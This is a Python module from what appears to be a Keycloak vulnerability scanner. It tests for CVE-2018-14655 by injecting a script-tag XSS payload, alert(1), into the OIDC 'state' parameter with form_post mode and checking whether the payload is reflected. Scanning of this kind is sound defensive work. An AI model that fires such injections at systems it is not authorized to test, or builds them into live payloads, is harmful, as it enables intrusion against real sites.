from keycloak_scanner.logging.printlogger import PrintLogger
from keycloak_scanner.scanners.scanner import Scanner
from keycloak_scanner.custom_logging import find



class FormPostXssScanner(Scanner, PrintLogger):

    def __init__(self, **kwars):
        super().__init__(**kwars)

    def perform(self, scan_properties):

        realms = scan_properties['realms'].keys()

        for realm in realms:
            clients = scan_properties['clients'][realm]
            well_known = scan_properties['wellknowns'][realm]
            if 'form_post' not in well_known['response_modes_supported']:
                super().verbose('post_form not in supported response types, can\' test CVE-2018-14655 for realm {}'.format(realm))
            else:
                url = well_known['authorization_endpoint']

                for client in clients:

                    payload = 'af0ifjsldkj"/><script type="text/javascript">alert(1)</script> <p class="'
                    r = super().session().get(url, params={
                            'state': payload,
                            'response_type': 'token',
                            'response_mode': 'form_post',
                            'client_id': client,
                            'nonce': 'csa3hMlvybERqcieLH'
                         })

                    if r.status_code == 200:
                        if payload in r.text:
                            find('XSS-CVE2018-14655', 'Vulnerable to CVE 2018 14655 realm:{}, client:{}'.format(realm, client))
